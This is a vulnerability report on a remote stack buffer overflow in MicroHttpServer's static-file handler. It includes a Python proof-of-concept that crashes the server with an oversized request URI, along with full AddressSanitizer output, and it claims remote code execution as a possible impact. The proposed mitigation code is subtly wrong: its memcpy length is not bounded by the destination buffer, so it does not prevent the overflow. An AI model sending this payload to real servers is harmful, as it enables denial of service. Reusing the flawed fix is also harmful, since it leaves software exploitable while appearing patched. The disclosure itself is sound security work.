After executing my fuzz tests, I discovered a remote stack buffer overflow in the C version of MicroHttpServer through commit 4398570 in the function uint8_t _ReadStaticFiles(HTTPReqMessage *req, HTTPResMessage *res) at lib/middleware.c, line 67:

```
memcpy(path + strlen(STATIC_FILE_FOLDER), uri, strlen(uri));
```


Any server or embedded application that utilizes MicroHttpServer is potentially at risk of remote code execution.  I've included reproduction steps in the following sections.


### Makefile Modifications

The following modifications were made to the Makefile to compile the server with address sanitizer and debug symbols.  The purpose of this is to track and verify the location of the stack buffer overflow:

```
PROJ=microhttpserver

CC=gcc
INCLUDES=-Ilib
DEFS=-D_PARSE_SIGNAL_ -D_PARSE_SIGNAL_INT_ -DDEBUG_MSG -DENABLE_STATIC_FILE=1
CFLAGS=-Os -Wall -fsanitize=address -g
SRCS=main.c app.c lib/server.c lib/middleware.c

all:
	$(CC) $(SRCS) $(INCLUDES) $(DEFS) $(CFLAGS) -o $(PROJ)

clean:
	rm -rf *.out *.bin *.exe *.o *.a *.so *.list *.img test build $(PROJ)
```

### Proof of Concept  Python3 Script

Save the following script to a file named poc.py:

```
#!/usr/bin/env python3

import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(("localhost", 8001))
sock.send(b"GET /"+b"%s"*5000+b" HTTP/1.1\r\nHost:localhost:8001\r\n\r\n")
response = sock.recv(4096)
sock.close()
```

### Starting MicroHttpServer

```
$ ./microhttpserver 
```

### Execute our Python3 Script

```
$ python3 poc.py
```

### Address Sanitizer Output

The following output is produced by address sanitizer, confirming the existence of the stack buffer overflow:

```
Listening
Accept 1 client.  127.0.0.1:35914
        Parse Header
        Parse body
=================================================================
==268450==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x7ffc75d79c90 at pc 0x7f141a66dcbf bp 0x7ffc75d79b50 sp 0x7ffc75d79310
WRITE of size 10001 at 0x7ffc75d79c90 thread T0
    #0 0x7f141a66dcbe in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:899
    #1 0x5632c9deeb74 in _ReadStaticFiles lib/middleware.c:67
    #2 0x5632c9deef9b in Dispatch lib/middleware.c:138
    #3 0x5632c9dee12b in _HTTPServerRequest lib/server.c:316
    #4 0x5632c9dee12b in _HTTPServerRequest lib/server.c:308
    #5 0x5632c9dee4e8 in HTTPServerRun lib/server.c:350
    #6 0x5632c9dec3c9 in main /home/kali/projects/fuzzing/MicroHttpServer/c-version/main.c:27
    #7 0x7f141a4456c9 in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58
    #8 0x7f141a445784 in __libc_start_main_impl ../csu/libc-start.c:360
    #9 0x5632c9dec460 in _start (/home/kali/projects/fuzzing/MicroHttpServer/c-version/microhttpserver+0x2460) (BuildId: 39e1eff8cc6e7225cc4b4972fb5564788133b49d)

Address 0x7ffc75d79c90 is located in stack of thread T0 at offset 288 in frame
    #0 0x5632c9dee8a3 in _ReadStaticFiles lib/middleware.c:36

  This frame has 2 object(s):
    [48, 127) 'header' (line 47)
    [160, 288) 'path' (line 45) <== Memory access at offset 288 overflows this variable
HINT: this may be a false positive if your program uses some custom stack unwind mechanism, swapcontext or vfork
      (longjmp and C++ exceptions *are* supported)
SUMMARY: AddressSanitizer: stack-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:899 in __interceptor_memcpy
Shadow bytes around the buggy address:
  0x7ffc75d79a00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffc75d79a80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffc75d79b00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1
  0x7ffc75d79b80: f1 f1 f1 f1 00 00 00 00 00 00 00 00 00 07 f2 f2
  0x7ffc75d79c00: f2 f2 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7ffc75d79c80: 00 00[f3]f3 f3 f3 00 00 00 00 00 00 00 00 00 00
  0x7ffc75d79d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7ffc75d79d80: 00 00 f1 f1 f1 f1 00 00 f2 f2 00 00 00 00 00 00
  0x7ffc75d79e00: 00 00 00 00 00 00 00 00 00 00 f2 f2 f2 f2 00 00
  0x7ffc75d79e80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f3 f3
  0x7ffc75d79f00: f3 f3 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==268450==ABORTING

```

### Impact

* [Remote Code Execution](https://www.cloudflare.com/learning/security/what-is-remote-code-execution/)
* [Denial of Service](https://attack.mitre.org/techniques/T0814/)

### Mitigation

The issue here is that memcpy is copying the value of 'uri' to  'path+srlen(STATIC_FILE_FOLDER)', but the size of the uri is larger than the destination buffer.

Buffer overflow vulnerability:
```
memcpy(path + strlen(STATIC_FILE_FOLDER), uri, strlen(uri));
```
This can be modified to prevent a buffer overflow:
```
memcpy(path + strlen(STATIC_FILE_FOLDER), uri, strlen(path) + strlen(STATIC_FILE_FOLDER));
```

### References

* [Buffer Overflow (CWE-121)](https://cwe.mitre.org/data/definitions/121.html)
* [OWASP Buffer Overflow Vulnerabilities](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
* [Address Sanitizer](https://github.com/google/sanitizers/wiki/AddressSanitizer)
